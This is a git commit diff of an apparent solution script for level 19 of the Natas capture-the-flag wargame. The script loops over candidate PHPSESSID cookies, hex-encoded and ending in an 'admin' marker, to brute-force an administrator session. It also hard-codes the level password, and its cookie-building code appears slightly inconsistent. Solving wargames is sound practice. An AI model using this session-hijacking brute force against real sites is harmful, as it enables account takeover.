5dd9310a569630608b3cec7804c3096f53f1ba13
l.rudolph <leonr502@gmail.com>
2022-07-09 19:46:52 +0200

    natas19

--- natas19.py
+++ natas19.py
@@ -2,4 +2,9 @@ import natasX
 
 natas = natasX
 
-print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php"))
+#print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php", data={"debug": "", "username": "admin", "password": "123"}).cookies.get("PHPSESSID"))
+
+for i in range(640, 1200):
+    print(f'{str(i).encode("utf-8").hex()}d61646d696e')
+    print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php",
+                       data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": f'{hex(i)}d61646d696e'}).text)
